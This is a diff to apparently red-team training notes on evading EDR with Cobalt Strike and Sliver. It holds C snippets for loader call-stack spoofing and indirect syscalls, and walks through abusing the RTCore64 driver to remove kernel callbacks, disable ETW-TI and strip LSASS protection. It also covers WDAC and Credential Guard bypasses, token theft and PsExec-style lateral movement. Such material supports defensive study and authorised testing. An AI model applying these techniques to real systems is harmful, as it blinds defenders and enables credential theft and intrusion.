@@ -1623,6 +1623,7 @@ lkd&gt; dt nt!_ETW_GUID_ENTRY 0xffffb30ecc9989c0
 <pre><code class="language-bash">(0xF4E1897C ^ 0xBB5D ^ 0xF1 ^ 0x4D) &amp; 0x3f = 1D</code></pre>
 
 <h2 id="crtl-load-time-evasion-3">3. Load-Time Evasion</h2>
+<p><strong>What is load-time evasion?</strong> Before Beacon can do anything, it needs to get into the target's memory. This is the most dangerous moment &mdash; the payload exists on disk (or in transit over the network) where antivirus and EDR can scan it byte-by-byte. Load-time evasion is about making the payload unrecognisable to static scanners during this initial loading phase. Once it's in memory and running, we switch to runtime evasion (Chapter 4).</p>
 <p>Beacon is a Windows DLL that must be loaded into memory to run. Traditionally it has been implemented as a reflective DLL based on Stephen Fewer's <a href="https://github.com/stephenfewer/ReflectiveDLLInjection" rel="noopener" target="_blank">ReflectiveDLLInjection</a> &mdash; a DLL that exports a function which, when executed, walks back over its own image, loads a fresh copy of itself into memory, resolves imports, applies relocations, and calls its entry point.</p>
 <p>Malleable C2 provides options for changing Beacon's reflective loading behaviour &mdash; <code>stage.allocator</code>, <code>stage.magic_pe</code>, <code>stage.module_[x86/x64]</code>, <code>stage.obfuscate</code>, etc. <strong>UDRL</strong> (User-Defined Reflective Loader, added in CS 4.4) gives full operator control over the loader. Two loader styles have shipped:</p>
 <p><strong>Sliver equivalent:</strong> Sliver implants are Go binaries, not reflective DLLs. The loader is built into the implant and isn't user-customizable the way UDRL is. The realistic adaptation is to generate <em>raw shellcode</em> with <code>generate --format shellcode</code> and wrap it in whatever external loader you want (Stardust, Crystal Palace, sRDI, donut, etc.). Sliver also ships <code>obfuscate</code> (garble-based) for binary obfuscation, and the <code>--evasion</code> build flag enables built-in mitigations like AMSI/ETW patching and the call stack manipulator in the implant.</p>
@@ -3173,10 +3174,11 @@ if ( dfshim != NULL ) {
 }</code></pre>
 
 <h2 id="crtl-runtime-evasion-4">4. Runtime Evasion</h2>
-<p>Load-time evasion gets Beacon into memory; runtime evasion keeps it there. Beacon is exposed to two main runtime detections:</p>
+<p><strong>What is runtime evasion?</strong> Load-time evasion (Chapter 3) got Beacon into memory without detection. But Beacon doesn't just sit there &mdash; it wakes up periodically to check in with the C2 server, execute commands, and go back to sleep. Every time it does something, it creates <em>runtime</em> artifacts that EDRs can detect. Runtime evasion keeps Beacon hidden while it's operating.</p>
+<p>Beacon is exposed to two main runtime detections:</p>
 <ul>
-<li>Unbacked API calls for the C2 channel.</li>
-<li>Static signatures targeting the Beacon DLL in memory.</li>
+<li><strong>Unbacked API calls:</strong> When Beacon calls Windows APIs (to send HTTP requests, open processes, etc.), the return address on the call stack points back to Beacon's memory &mdash; which isn't backed by any legitimate DLL on disk. EDRs inspect call stacks and flag calls originating from "unbacked" (non-file-backed) memory regions.</li>
+<li><strong>Static signatures in memory:</strong> Even though the Beacon DLL was encrypted on disk, it's decrypted in memory to run. Memory scanners look for known byte patterns (signatures) of Beacon's code and data structures.</li>
 </ul>
 <p>Cobalt Strike's native answer is <strong>Sleepmask</strong> (obfuscates Beacon's memory between check-ins) and <strong>BeaconGate</strong> (API proxy for Beacon that pushes calls through Sleepmask for evasions like stack spoofing). We're not using the CS kits, so we implement equivalent tradecraft via a Crystal Palace PICO loaded alongside the Beacon DLL.</p>
 <p>PICO is short for position-independent code object, and are Crystal Palace's convention for running COFFs in-memory. They are like BOFs (Beacon Object Files), but without the Beacon-specific API.</p>
@@ -4242,6 +4244,7 @@ BOOL bypass_cfg ( PVOID address )
 }</code></pre>
 
 <h2 id="crtl-postex-evasion-5">5. Post-Exploitation Evasion</h2>
+<p><strong>What is post-exploitation evasion?</strong> Getting Beacon into memory (load-time) and keeping it hidden while sleeping (runtime) are just the first two battles. The third is what happens when you actually <em>do things</em> &mdash; dump credentials, enumerate the domain, inject into other processes. Each post-exploitation action has its own detection surface. An EDR that missed Beacon's initial load can still catch it when it runs Mimikatz, injects shellcode into another process, or spawns a child process to execute a tool.</p>
 <p>Beacon is now resident in memory with load-time and runtime evasion in place. Post-exploitation introduces a new attack surface: every command that runs an external capability has its own footprint to manage. Most Beacon commands fall into one of three categories:</p>
 <ul>
 <li><strong>Beacon Object File (BOF)</strong> &mdash; inline execution inside the Beacon process.</li>
@@ -5307,12 +5310,16 @@ Guid
 8ab6880f-1f83-4d40-a331-3d4164d25eb1</code></pre>
 
 <h2 id="crtl-kernel-protections-7">6. Kernel-Mode Bypasses</h2>
-<p>EDR telemetry like kernel callbacks and ETW-TI is generated from kernel memory. To disable it, we need to write to kernel memory &mdash; which can only be done from a kernel-mode driver. Writing our own driver isn't viable because of <strong>Driver Signature Enforcement (DSE)</strong>, which blocks unsigned drivers from loading.</p>
-<p>The realistic option is to abuse a legitimate driver that's either vulnerable to code execution in the kernel, or just badly designed and exposes IOCTLs for arbitrary kernel memory read/write. <a href="https://www.loldrivers.io">LOLDrivers</a> catalogues these. You can enumerate a target to see if a vulnerable driver is already installed, or install one yourself (local admin only).</p>
+<p><strong>Why this matters:</strong> Everything we've done so far &mdash; unhooking ntdll, spoofing call stacks, encrypting Beacon in memory &mdash; operates in <em>user mode</em>. But EDRs also collect telemetry from the <em>kernel</em>, where our user-mode evasions have no effect. The kernel is the operating system's core &mdash; it manages processes, memory, and hardware. Code running in the kernel has unrestricted access to everything on the system.</p>
+<p>EDRs register <strong>kernel callbacks</strong> &mdash; functions the kernel calls automatically whenever something interesting happens (a new process starts, a DLL loads, a registry key is modified, a handle is opened). These callbacks feed the EDR's detection engine from a vantage point that user-mode malware cannot tamper with &mdash; unless we find a way into the kernel ourselves.</p>
+<p>EDRs also use <strong>ETW-TI (Event Tracing for Windows &mdash; Threat Intelligence)</strong>, a special ETW provider that only the kernel can write to and only PPL-protected processes can consume. It reports events like process injection, suspicious image loads, and memory permission changes directly from the kernel.</p>
+<p>To disable these kernel-resident protections, we need to write to kernel memory &mdash; which can only be done from a kernel-mode driver. Writing our own driver isn't viable because of <strong>Driver Signature Enforcement (DSE)</strong>, which requires all kernel drivers to be signed by a trusted certificate authority.</p>
+<p>The realistic option is to abuse a legitimate, signed driver that happens to be vulnerable &mdash; one that exposes <strong>IOCTLs</strong> (I/O Control codes &mdash; a way for user-mode programs to send commands to kernel drivers) that allow arbitrary kernel memory read/write. Hardware vendors sometimes ship drivers with these dangerous capabilities for diagnostics or overclocking. <a href="https://www.loldrivers.io">LOLDrivers</a> catalogues known vulnerable drivers. You can check if one is already installed on the target, or install one yourself (local admin required).</p>
+<p>The attack chain is: <strong>load vulnerable driver &rarr; use its read/write IOCTLs to find and patch kernel structures &rarr; disable EDR callbacks and ETW-TI &rarr; operate freely</strong>.</p>
 
 <h3 id="crtl-vulndrv-rtcore64">6.1 RTCore64</h3>
-<p><code>RTCore64.sys</code> ships with MSI Afterburner (GPU overclocking software) and exposes two IOCTLs to user mode: one for arbitrary kernel memory read, one for arbitrary kernel memory write. Those two primitives are enough to disable most kernel-resident protections.</p>
-<p>The request payload uses a fixed structure with padding around the address, write size, and value:</p>
+<p><code>RTCore64.sys</code> ships with MSI Afterburner (GPU overclocking software). It was designed so the overclocking app could read/write hardware registers, but the IOCTLs it exposes are not restricted to hardware addresses &mdash; they allow reading and writing <em>any</em> kernel memory address. This gives us two primitives that are enough to disable most kernel-resident protections: read any kernel address (to find structures) and write any kernel address (to patch them).</p>
+<p>To talk to the driver, we use <code>DeviceIoControl</code> &mdash; a Windows API that sends a command (identified by an IOCTL code) and a data buffer to a kernel driver, and gets a response back. Think of it as "send a message to the driver and get an answer." The request payload uses a fixed structure with padding around the address, write size, and value:</p>
 <pre><code class="language-c">struct RTCORE64_MEMORY {
 	BYTE    Pad0 [ 8 ];
 	DWORD64 Address;
@@ -5404,7 +5411,9 @@ SERVICE_NAME: RTCore64
 <p>This section walks through using RTCore64 and the kernel BOFs to disable specific kernel-resident protections and telemetry.</p>
 
 <h3 id="crtl-vulndrv-kernel-callbacks">6.4 Kernel callbacks</h3>
-<p><code>list_callbacks</code> dumps all process, thread, image-load, handle-op, and registry callbacks registered with the kernel. The output shows which driver owns each entry:</p>
+<p><strong>What are kernel callbacks?</strong> Windows lets drivers register functions that the kernel calls automatically when specific events happen. For example, a <strong>process callback</strong> fires every time a new process is created &mdash; this is how an EDR knows about every process launch on the system, even if the process tries to hide. A <strong>thread callback</strong> fires on new threads, an <strong>image-load callback</strong> fires when a DLL or EXE is loaded into memory, and so on.</p>
+<p>By removing an EDR's callbacks, we blind it to those events. If we remove the EDR's process-creation callback, it no longer gets notified when we spawn new processes. If we remove its image-load callback, it no longer sees DLLs being loaded &mdash; including our payload DLLs.</p>
+<p><code>list_callbacks</code> dumps all process, thread, image-load, handle-op, and registry callbacks registered with the kernel. The output shows which driver owns each entry &mdash; look for the EDR's driver name (e.g. <code>WdFilter.sys</code> for Windows Defender, <code>KslD.sys</code> for Kaspersky):</p>
 <pre><code class="language-bash">beacon&gt; list_callbacks
 [*] Tasked Beacon to list kernel callbacks
 
@@ -5496,6 +5505,8 @@ Process Callbacks
 [10] 0xFFFFF8003FAD1B80 (wtd.sys)</code></pre>
 
 <h3 id="crtl-vulndrv-etw-ti">6.5 ETW-TI</h3>
+<p><strong>What is ETW-TI?</strong> ETW (Event Tracing for Windows) is Windows' built-in logging framework. ETW-TI is a special "Threat Intelligence" provider that only the kernel can write events to, and only PPL-protected security processes (like Defender) can read from. It reports high-value security events &mdash; process injection attempts, suspicious memory permission changes, handle access to sensitive processes &mdash; directly from the kernel. Unlike user-mode ETW (which we can patch by modifying ntdll in our own process), ETW-TI lives in kernel memory and requires a kernel write primitive to disable.</p>
+<p>Each ETW provider has a GUID (a unique identifier) and an <code>IsEnabled</code> flag in kernel memory. If we set <code>IsEnabled</code> to <code>0</code>, the provider stops generating events &mdash; the EDR's telemetry feed goes dark for that provider.</p>
 <p><code>etw_enum</code> takes an ETW provider GUID, locates it in the relevant hash bucket, and returns the value of the <code>IsEnabled</code> field. <code>etw_disable</code> patches <code>IsEnabled</code> to <code>0x0</code> to silence it:</p>
 <pre><code class="language-bash">beacon&gt; etw_enum {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}
 [*] Tasked Beacon to enum ETW-TI provider
@@ -5511,6 +5522,7 @@ beacon&gt; etw_enum {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}
 ProviderEnableInfo.IsEnabled == 0</code></pre>
 
 <h3 id="crtl-vulndrv-protected-processes">6.6 Protected Processes</h3>
+<p><strong>Why this matters:</strong> Even as a local administrator, you cannot dump credentials from LSASS if it runs as a Protected Process Light (PPL). Tools like Mimikatz need to read LSASS memory (<code>PROCESS_VM_READ</code>), but the kernel strips that access right from any handle opened by a non-protected process. This is the single biggest obstacle to credential dumping on modern Windows.</p>
 <p><strong>Protected Processes (PP)</strong> launched in Windows Vista as a DRM enforcement mechanism. The kernel restricts what access rights a non-protected process can obtain to a protected one &mdash; even an admin calling <code>OpenProcess</code> with <code>PROCESS_ALL_ACCESS</code> gets a handle with the sensitive rights (<code>PROCESS_VM_OPERATION</code>, <code>PROCESS_VM_READ</code>, <code>PROCESS_TERMINATE</code>, etc.) stripped out.</p>
 <p><strong>Protected Process Light (PPL)</strong> extended this with a hierarchical signer model. Higher signer levels can access lower ones but not vice versa. The protection level for a process is stored in <code>EPROCESS-&gt;Protection</code> as a <code>_PS_PROTECTION</code> struct:</p>
 <pre><code class="language-c">struct _PS_PROTECTION {
@@ -5552,7 +5564,9 @@ Type   : PsProtectedTypeNone
 Signer : PsProtectedSignerNone</code></pre>
 
 <h2 id="crtl-app-control-8">7. WDAC Bypass</h2>
-<p><strong>App Control for Business</strong> is Windows' kernel-enforced application allow-listing. It restricts which executables, scripts, and drivers can run via a software-restriction policy. Compared to AppLocker:</p>
+<p><strong>What is WDAC?</strong> Windows Defender Application Control (WDAC), now called <strong>App Control for Business</strong>, is a security feature that only allows pre-approved programs to run. Think of it as a bouncer at a club door &mdash; if your executable isn't on the guest list, it doesn't get in. Unlike antivirus (which tries to identify <em>bad</em> programs), application control only allows <em>known-good</em> programs and blocks everything else.</p>
+<p><strong>Why this matters for red teamers:</strong> If the target has WDAC enabled, you cannot simply drop a payload on disk and run it &mdash; the kernel will block execution before the first instruction runs. You need to either find a way to run code through an already-approved application (a "Living Off the Land" binary, or LOLBAS), abuse a weakness in the policy itself, or sign your payload with a trusted certificate. WDAC is kernel-enforced, meaning it cannot be disabled or bypassed from user mode the way AppLocker can.</p>
+<p>Compared to AppLocker:</p>
 <table class="custom-table">
 <thead><tr><th>Feature</th><th>AppLocker</th><th>App Control</th></tr></thead>
 <tbody>
@@ -5896,9 +5910,11 @@ Press Enter to Continue</code></pre>
 <p>If the target process is already running (like <code>MsMpEng.exe</code>), a reboot is needed before the deny takes effect.</p>
 
 <h2 id="crtl-credential-guard-9">8. Credential Guard Bypass</h2>
+<p><strong>What is Credential Guard?</strong> In a traditional Windows environment, when a user logs in, their password hash and Kerberos tickets are stored in the LSASS process. Attackers with admin access can dump LSASS memory (using Mimikatz, for example) and extract those credentials to impersonate users across the network. Credential Guard is Microsoft's answer to this &mdash; it moves those secrets into a hardware-backed vault that even administrators cannot read.</p>
+<p><strong>The practical impact:</strong> On a system with Credential Guard enabled, the standard "dump LSASS, get hashes, pass-the-hash" attack chain is broken. You need to use alternative credential access techniques that target secrets Credential Guard does <em>not</em> protect.</p>
 
 <h3 id="crtl-cg-secrets">8.1 Credential Guard Secrets</h3>
-<p>Credential Guard uses hardware virtualisation and the Windows hypervisor to isolate authentication materials &mdash; NTLM hashes, Kerberos TGTs, etc. &mdash; in a secure virtual container. It blocks techniques like Mimikatz <code>sekurlsa::ekeys</code> and Rubeus <code>dump</code>.</p>
+<p>Credential Guard uses hardware virtualisation (VBS &mdash; Virtualisation-Based Security) and the Windows hypervisor to isolate authentication materials &mdash; NTLM hashes, Kerberos TGTs, etc. &mdash; in a secure virtual container. Even a SYSTEM-level process cannot peek inside. It blocks techniques like Mimikatz <code>sekurlsa::ekeys</code> and Rubeus <code>dump</code>.</p>
 <table class="custom-table">
 <thead><tr><th>State</th><th>Secrets live in</th><th>Process</th></tr></thead>
 <tbody>
@@ -5909,6 +5925,7 @@ Press Enter to Continue</code></pre>
 <p>VBS is an official Microsoft security boundary: data inside the enclave cannot be accessed or tampered with from the outside. Don't confuse Credential Guard with LSA Protected Process (RunAsPPL).</p>
 
 <h3 id="crtl-cg-no-tgts">8.2 No TGTs for You</h3>
+<p><strong>Background for beginners:</strong> Kerberos authentication works with <em>tickets</em>. When you log into a domain, you get a <strong>TGT (Ticket Granting Ticket)</strong> &mdash; think of it as a master key that lets you request access to any service. Normally, an attacker who steals a TGT can impersonate that user for anything. Credential Guard's main job is to make TGTs unstealable.</p>
 <p>When a user first logs in, LSA passes the initial credentials to LSAIso and asks it to store them. LSAIso stores them and returns a handle that LSA uses to reference them later, then LSA destroys its copy. To obtain a TGT, LSA must ask LSAIso to encrypt the AS-REQ timestamp using the credential handle — the secrets themselves never leave the secure enclave.</p>
 <p>When the AS-REP arrives, LSA cannot decrypt the logon session key because it no longer knows the user's password. It passes the AS-REP to LSAIso for decryption, but LSAIso does not return the decrypted session key — it re-encrypts it with a key only it knows. All subsequent TGS-REQs are handled the same way: LSA gives the request to LSAIso to encrypt the authenticator, and LSAIso decrypts the returned TGS-REP.</p>
 <p>From an attacker's perspective, you can dump encrypted TGTs but the <code>KeyType</code> will show as something like <code>*_credguard</code>. Attempting to use the TGT for anything (e.g. <code>asktgs</code>) will fail. Rubeus crafts Kerberos messages from scratch and sends them directly to the KDC on port 88 &mdash; it cannot talk to LSAIso and cannot access the TGT's logon session key. This breaks many Kerberos abuse primitives:</p>
@@ -5922,6 +5939,7 @@ Press Enter to Continue</code></pre>
 </table>
 
 <h3 id="crtl-cg-service-tickets">8.3 Extracting Service Tickets</h3>
+<p><strong>Why service tickets work:</strong> Unlike TGTs (which Credential Guard locks inside the enclave), <strong>service tickets</strong> are handed back to the calling process in cleartext so it can present them to the target service. Credential Guard protects the <em>master key</em> (TGT) but not the <em>individual access tokens</em> (service tickets) derived from it. This means: if a user has already authenticated to a service (e.g. connected to a file share, logged into a web app), you can extract that service ticket from memory and reuse it.</p>
 <p>VBS is a security boundary, so extracting TGTs or their session keys from LSAIso should not be expected to work (any such vulnerabilities are quickly patched). Lean into credential access tactics that Credential Guard does not protect:</p>
 <table class="custom-table">
 <thead><tr><th>Source</th><th>Notes</th></tr></thead>
@@ -6158,10 +6176,13 @@ MIINX[...snip...]CCAA=</code></pre>
 
 <h2 id="crtl-lateral-movement-6">9. User Impersonation</h2>
 
+<p><strong>What is token impersonation?</strong> Every process and thread in Windows runs under a <em>security token</em> &mdash; an object that says "I am user X with these privileges." When your Beacon runs, it inherits the token of whatever user launched it. To access resources as a <em>different</em> user (e.g. a domain admin), you need to either create a new token with their credentials or steal an existing token from a process they're running. This is how you move from "I compromised one user" to "I can act as any user on the network."</p>
+<p><strong>Why EDRs care:</strong> Token manipulation uses Windows APIs (<code>LogonUserA</code>, <code>OpenProcessToken</code>, <code>DuplicateToken</code>, <code>ImpersonateLoggedOnUser</code>) that EDRs monitor closely. The challenge is not <em>whether</em> you can impersonate &mdash; it's doing it without the EDR flagging the API call pattern, the process lineage, or the resulting logon event.</p>
 <p>RTO covered multiple user impersonation techniques, but not all of them are viable in a modern EDR world.</p>
 
 <h3 id="crtl-lateral-make-token-createnetonly">9.1 make_token / createnetonly</h3>
-<p>Both commands clone the current token and attach new credentials for outbound connections, but go through different APIs:</p>
+<p><strong>What these do:</strong> Both commands let you authenticate to remote systems as a different user without changing who you are locally. Your Beacon keeps running as the original user, but outbound connections (SMB shares, WMI, etc.) use the new credentials. This is the most common way to "use" compromised credentials.</p>
+<p>Both clone the current token and attach new credentials for outbound connections, but go through different APIs:</p>
 <table class="custom-table">
 <thead><tr><th>Command</th><th>API</th><th>Logon type</th></tr></thead>
 <tbody>
@@ -6181,12 +6202,15 @@ sliver (SESSION) &gt; rev2self
 # Drops the impersonated token</code></pre>
 
 <h3 id="crtl-lateral-steal-token">9.2 steal_token</h3>
-<p>There's often no problem with stealing and impersonating the primary access token of other processes, as long as we can call the underlying APIs (<code>OpenProcess</code>, <code>OpenProcessToken</code>, <code>DuplicateToken</code>, <code>ImpersonateLoggedOnUser</code>) in an OPSEC-safe way. That may involve call stack spoofing, API unhooking, or syscalls, depending on the EDR you're up against.</p>
+<p><strong>What this does:</strong> Instead of creating a new token from a password or hash, <code>steal_token</code> takes an existing token from a process that's already running as the target user. For example, if a domain admin has a process running on the machine (maybe an RDP session, a service, or a scheduled task), you open that process, duplicate its token, and apply it to your own thread. Now your Beacon can act as that user.</p>
+<p><strong>The API chain:</strong> <code>OpenProcess</code> (get a handle to the target process) &rarr; <code>OpenProcessToken</code> (get a handle to its token) &rarr; <code>DuplicateTokenEx</code> (make a copy) &rarr; <code>ImpersonateLoggedOnUser</code> (apply the copy to your thread). Each of these calls is hooked by EDRs.</p>
+<p>There's often no problem with stealing and impersonating the primary access token of other processes, as long as we can call the underlying APIs in an OPSEC-safe way. That may involve call stack spoofing, API unhooking, or syscalls, depending on the EDR you're up against.</p>
 <p><strong>Sliver equivalent:</strong> <code>impersonate</code> takes a target username and finds an existing logon session for them, then duplicates and impersonates that token. Drop with <code>rev2self</code>:</p>
 <pre><code class="language-bash">sliver (SESSION) &gt; impersonate contoso\\Administrator
 sliver (SESSION) &gt; rev2self</code></pre>
 
 <h3 id="crtl-lateral-kerberos">9.3 Kerberos</h3>
+<p><strong>The problem:</strong> Tools like Rubeus generate raw Kerberos network traffic directly &mdash; sending AS-REQ and TGS-REQ packets to the domain controller on port 88. On a normal Windows machine, the <em>only</em> process that does this is <code>lsass.exe</code>. When an EDR sees Kerberos traffic originating from <code>beacon.exe</code> or an injected thread in <code>explorer.exe</code>, it's an immediate red flag.</p>
 <p>Most techniques like <code>asktgt</code>, <code>asktgs</code>, and <code>s4u</code> abuse (where raw Kerberos traffic is generated directly by the tool) are not possible against EDRs that monitor network traffic. On Windows, the only native process that normally generates Kerberos traffic from a domain joined host is <code>lsass.exe</code>, although there are some exceptions like <code>AzureADConnect.exe</code>.</p>
 <p>Dumping tickets and passing them into another logon session still works fine, as these actions don't touch LSASS directly, nor generate Kerberos traffic. However, there are other heavy restrictions on Kerberos tradecraft on modern hosts, which are discussed in the Credential Guard chapter.</p>
 <p><strong>Sliver equivalent:</strong> Sliver doesn't have native Kerberos tradecraft, but Rubeus is one armory install away and runs in-memory:</p>
@@ -6198,8 +6222,11 @@ sliver (SESSION) &gt; rubeus ptt /ticket:doIGZ...
 # Same OPSEC problem as on CS &mdash; raw Kerberos traffic from a non-LSASS process is a red flag.</code></pre>
 
 <h2 id="crtl-lateral-movement">10. Lateral Movement</h2>
+<p><strong>What is lateral movement?</strong> Once you have a foothold on one machine and credentials (or tokens) for another user, lateral movement is the process of executing code on a <em>different</em> machine in the network. You're "moving laterally" across the domain &mdash; from workstation to server, from server to domain controller.</p>
+<p><strong>Why this is hard under EDR:</strong> Every lateral movement technique creates artifacts on both the source and destination machine &mdash; network connections, service installations, process creation events, file writes. EDRs correlate these artifacts. For example, "a recently-created unsigned executable was written over SMB and then immediately launched via a new service" is a textbook PsExec detection. The challenge is choosing techniques whose artifacts blend with legitimate administration, and wrapping the API calls in enough evasion to survive the source machine's EDR.</p>
 
 <h3 id="crtl-lateral-wmi">10.1 WMI</h3>
+<p><strong>Why WMI:</strong> WMI (Windows Management Instrumentation) is a legitimate remote management framework built into Windows. Administrators use it daily for tasks like querying system info, running scripts, and managing services. Because WMI traffic is <em>expected</em> in enterprise environments, it blends better than techniques like PsExec that install services.</p>
 <p>The <code>remote-exec wmi</code> command is implemented as a BOF that calls <code>combase.dll!CoCreateInstance</code> to instantiate the COM object for remote WMI. That triggers a load-library event for <code>wbemprox.dll</code>, and because BOFs run from unbacked memory, the load looks like this:</p>
 <pre><code class="language-bash">C:\Windows\System32\KernelBase.dll!LoadLibraryExW+0xe6
 C:\Windows\System32\combase.dll!CoReleaseServerProcess+0xee9
@@ -6260,7 +6287,8 @@ sliver (SESSION) &gt; psexec -s "MyService" -d "Update Service" -c \\\\lon-dc-1\
 </ul>
 
 <h3 id="crtl-lateral-psexec">10.2 PsExec</h3>
-<p>The use of PsExec is usually detected due to a service being created with a UNC <code>binPath</code>, such as <code>\\[target]\ADMIN$\foo.exe</code>. This is the behaviour of Beacon's built-in <code>jump psexec[64]</code> command. You could write a custom Aggressor script to use <code>C:\Windows\</code> (or some other directory) instead; or an alternate technique like SCShell, as this already uses <code>System32</code>. You could also upload the payload manually and execute it using <code>remote-exec psexec</code> (but don't forget to delete it afterwards). Remember that the service payload is the only one that performs remote injection. You will therefore certainly want to load the Artifact Kit to control the <code>spawnto</code>, etc.</p>
+<p><strong>How PsExec works:</strong> PsExec-style lateral movement creates a Windows <em>service</em> on the remote machine that points to your payload. The payload runs as SYSTEM (the highest-privilege account). The classic flow is: connect to the target via SMB &rarr; upload payload to <code>ADMIN$</code> share &rarr; create a service with <code>binPath</code> pointing at the uploaded file &rarr; start the service &rarr; payload executes &rarr; Beacon calls back.</p>
+<p><strong>Why it gets caught:</strong> The use of PsExec is usually detected due to a service being created with a UNC <code>binPath</code>, such as <code>\\[target]\ADMIN$\foo.exe</code>. This is the behaviour of Beacon's built-in <code>jump psexec[64]</code> command. You could write a custom Aggressor script to use <code>C:\Windows\</code> (or some other directory) instead; or an alternate technique like SCShell, as this already uses <code>System32</code>. You could also upload the payload manually and execute it using <code>remote-exec psexec</code> (but don't forget to delete it afterwards). Remember that the service payload is the only one that performs remote injection. You will therefore certainly want to load the Artifact Kit to control the <code>spawnto</code>, etc.</p>
 <p><strong>Sliver equivalent:</strong> Sliver's <code>psexec</code> creates a Windows service on the target and points it at an implant binary you upload. Same UNC-binPath signature applies. Mitigation: upload to a non-UNC path first, then point the service at the local copy:</p>
 <pre><code class="language-bash"># Default behaviour (UNC binPath &mdash; signatured)
 sliver (SESSION) &gt; psexec -s "WinUpdate" -d "Windows Update Service" lon-dc-1
@@ -6274,6 +6302,7 @@ sliver (SESSION) &gt; execute -t -o sc.exe \\\\lon-dc-1 start WinUpdate
 sliver &gt; armory install scshell</code></pre>
 
 <h3 id="crtl-lateral-beacon-rdll-generate-local">10.3 BEACON_RDLL_GENERATE_LOCAL</h3>
+<p><strong>What is this?</strong> When you use the Cobalt Strike UI to generate a payload (Attacks &rarr; Packages), the team server runs the <code>BEACON_RDLL_GENERATE</code> Aggressor hook to apply your custom loader and evasion. But when a <em>running Beacon</em> needs to generate a payload on the fly &mdash; for example, <code>spawn</code> (create a new Beacon), <code>spawnas</code> (Beacon as another user), or <code>jump</code> (lateral movement) &mdash; it uses the LOCAL variant instead. If you don't register the LOCAL hook, these commands produce vanilla, un-evasion'd Beacons that will get caught immediately.</p>
 <p><code>BEACON_RDLL_GENERATE_LOCAL</code> is the in-Beacon analogue of <code>BEACON_RDLL_GENERATE</code>. The UI-side hook fires when a payload is generated from the team server UI; the LOCAL variant fires when a Beacon command like <code>spawn</code> or <code>spawnas</code> needs to produce a payload on the fly.</p>
 <p>It receives the same arguments as the UI hook, plus two extras:</p>
 <table class="custom-table">
@@ -6749,6 +6778,36 @@ set BEACON_RDLL_GENERATE {
       </ul>
     </li>
   </ul>
+<pre><code class="language-c">// RWX Removal — allocate RW, load, then set per-section permissions
+LPVOID base = VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+// ... copy PE headers and sections into base ...
+
+// Walk section headers and apply correct protections
+PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(ntHeaders);
+for (WORD i = 0; i &lt; ntHeaders-&gt;FileHeader.NumberOfSections; i++) {
+    DWORD protect = PAGE_READONLY;
+    if (sec[i].Characteristics &amp; IMAGE_SCN_MEM_EXECUTE)
+        protect = PAGE_EXECUTE_READ;
+    else if (sec[i].Characteristics &amp; IMAGE_SCN_MEM_WRITE)
+        protect = PAGE_READWRITE;
+
+    DWORD oldProtect;
+    VirtualProtect(
+        (LPBYTE)base + sec[i].VirtualAddress,
+        sec[i].Misc.VirtualSize,
+        protect,
+        &amp;oldProtect
+    );
+}
+
+// Verify: walk memory regions and assert zero RWX pages
+MEMORY_BASIC_INFORMATION mbi;
+for (LPBYTE addr = (LPBYTE)base; addr &lt; (LPBYTE)base + imageSize;) {
+    VirtualQuery(addr, &amp;mbi, sizeof(mbi));
+    // PAGE_EXECUTE_READWRITE (0x40) should never appear
+    if (mbi.Protect == PAGE_EXECUTE_READWRITE) { /* FAIL */ }
+    addr += mbi.RegionSize;
+}</code></pre>
 
 <h4 id="methodology-load-time-loader-callstack">11.3.5 Loader Call Stack Spoofing</h4>
   <ul>
@@ -6773,6 +6832,37 @@ set BEACON_RDLL_GENERATE {
       </ul>
     </li>
   </ul>
+<pre><code class="language-c">// Call Stack Spoofing — Draugr-style synthetic frames
+typedef struct _FUNCTION_CALL {
+    PVOID   pFunction;      // target API address
+    PVOID   pArgs[8];       // arguments
+    DWORD   dwArgCount;
+} FUNCTION_CALL;
+
+// Build synthetic return addresses from legitimate modules
+PVOID rtlUserThreadStart = GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlUserThreadStart");
+PVOID baseThreadInitThunk = GetProcAddress(GetModuleHandleA("kernel32.dll"), "BaseThreadInitThunk");
+
+void spoof_call(FUNCTION_CALL* fc) {
+    // Push fake stack frames:
+    //   [1] RtlUserThreadStart+0x21  (bottom of legitimate stack)
+    //   [2] BaseThreadInitThunk+0x1a (legitimate thread init)
+    //   [3] target API call          (appears called from kernel32)
+    // Assembly trampoline pushes these return addresses onto the stack
+    // then JMPs to fc-&gt;pFunction — EDR sees a clean call chain
+}
+
+// Usage: hook VirtualAlloc through the loader spec
+LPVOID WINAPI _VirtualAlloc(LPVOID addr, SIZE_T size, DWORD type, DWORD prot) {
+    FUNCTION_CALL fc = {0};
+    fc.pFunction = pRealVirtualAlloc;
+    fc.pArgs[0]  = addr;
+    fc.pArgs[1]  = (PVOID)size;
+    fc.pArgs[2]  = (PVOID)(ULONG_PTR)type;
+    fc.pArgs[3]  = (PVOID)(ULONG_PTR)prot;
+    fc.dwArgCount = 4;
+    return (LPVOID)spoof_call(&amp;fc);
+}</code></pre>
 
 <p><strong>General references:</strong> <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/" target="_blank" rel="noopener noreferrer">Cobalt Strike user guide</a> &middot; <a href="https://outflank.nl/blog/" target="_blank" rel="noopener noreferrer">Outflank blog</a> &middot; <a href="https://maldevacademy.com/" target="_blank" rel="noopener noreferrer">Maldev Academy resources</a></p>
 
@@ -6842,6 +6932,34 @@ addhook "CoCreateInstance"    "_hook_CoCreateInstance"</code></pre>
       </ul>
     </li>
   </ul>
+<pre><code class="language-c">// RecycledGate — indirect syscall via a clean ntdll gadget
+// 1. Walk ntdll EAT to resolve SSN for target function
+DWORD resolve_ssn(const char* funcName) {
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    BYTE* pFunc = (BYTE*)GetProcAddress(ntdll, funcName);
+    // SSN is at offset +4 in the stub: mov eax, SSN
+    // Pattern: 4C 8B D1 B8 [SSN as DWORD]
+    if (pFunc[0] == 0x4C &amp;&amp; pFunc[3] == 0xB8)
+        return *(DWORD*)(pFunc + 4);
+    // If hooked, use neighbor sorting (Halo's Gate)
+    return halo_gate_resolve(pFunc);
+}
+
+// 2. Find a clean "syscall; ret" gadget in ntdll .text
+PVOID find_syscall_gadget() {
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    PIMAGE_SECTION_HEADER text = get_section(ntdll, ".text");
+    BYTE* start = (BYTE*)ntdll + text-&gt;VirtualAddress;
